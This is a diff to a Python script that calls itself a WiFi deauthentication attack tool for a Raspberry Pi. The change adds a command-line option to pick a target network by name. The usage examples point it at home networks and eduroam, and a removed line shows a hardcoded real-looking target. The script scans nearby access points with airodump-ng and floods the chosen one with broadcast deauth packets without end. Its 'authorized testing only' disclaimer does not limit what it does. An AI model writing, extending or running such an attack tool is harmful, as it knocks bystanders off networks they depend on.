@@ -3,18 +3,24 @@ WiFi Deauthentication Attack Script for Raspberry Pi Wardrive
 
 This script performs automated WiFi deauthentication attacks on nearby networks.
 It continuously scans for WiFi access points using airodump-ng, identifies the
-strongest signal, and sends deauth packets to disrupt connections.
+strongest signal (or a specific target), and sends deauth packets to disrupt connections.
+
+Usage:
+    sudo python3 attack.py                    # Attack strongest network
+    sudo python3 attack.py -t "HomeWiFi"      # Attack specific network
+    sudo python3 attack.py --target eduroam   # Attack eduroam network
+    sudo python3 attack.py --help             # Show help
 
 The script is designed to run on a Raspberry Pi with a WiFi adapter capable of
 monitor mode (e.g., Alfa series). It's intended for educational and authorized
 testing purposes only.
 
 Main workflow:
-1. Enable monitor mode on the wireless interface
+1. Enable monitor mode on the wireless interface (automatic)
 2. Scan for nearby access points (airodump-ng)
 3. Parse CSV data to identify target networks
-4. Sort by signal strength and select the strongest AP
-5. Send deauthentication packets to the target
+4. Select target: strongest signal OR specific ESSID from -t argument
+5. Send deauthentication packets to the target (broadcast to all clients)
 6. Repeat indefinitely
 
 Author: Security Research
@@ -28,6 +34,7 @@ import os
 import time
 import re
 import pwd
+import argparse
 #import pprint
 #import _thread
 
@@ -408,6 +415,29 @@ def airmon_start(interface):
 # MAIN PROGRAM
 # ============================================================================
 
+# Parse command-line arguments
+parser = argparse.ArgumentParser(
+	description='WiFi Deauthentication Attack Script for Raspberry Pi',
+	formatter_class=argparse.RawDescriptionHelpFormatter,
+	epilog='''
+Examples:
+  sudo python3 attack.py                    # Attack strongest network (default)
+  sudo python3 attack.py -t "HomeWiFi"      # Attack specific network
+  sudo python3 attack.py --target eduroam   # Attack eduroam network
+  
+Note: Must be run as root (sudo)
+	'''
+)
+parser.add_argument(
+	'-t', '--target',
+	type=str,
+	default=None,
+	metavar='ESSID',
+	help='Target specific network name (ESSID). If not specified, attacks strongest signal.'
+)
+
+args = parser.parse_args()
+
 # Security check: ensure script is run with root privileges
 # Root is required for monitor mode, packet injection, and system commands
 if(os.geteuid() != 0):
@@ -433,11 +463,8 @@ iface = "wlan1"                   # Wireless interface in monitor mode (usually 
 deauth_max_seconds = 30           # Time between scans (unused in current implementation)
                                    # Note: Could be used to refresh targets periodically
 
-# Target Configuration
-# Set to a specific network name (e.g., "eduroam") to target only that network
-# Set to None to target all networks
-target_essid = "HBK-BS"               # None = attack all networks found
-                                   # Or set to "eduroam" for specific network
+# Target Configuration (from command-line argument)
+target_essid = args.target        # None = attack strongest, or specific ESSID from -t argument
 
 # Attack Mode
 # Set to True to attack all found networks/APs sequentially (fast iteration)
@@ -460,7 +487,8 @@ if LCD_AVAILABLE:
         LCD_AVAILABLE = False
 
 # Enable monitor mode on the wireless interface
-# NOTE: Consider running this once in startup script instead of every time
+# This will stop any existing monitor mode and start fresh, killing interfering processes
+# Ensures the interface is properly set to monitor mode even if previously in managed mode
 if LCD_AVAILABLE:
     display_status("Starting", "Monitor Mode...")
     
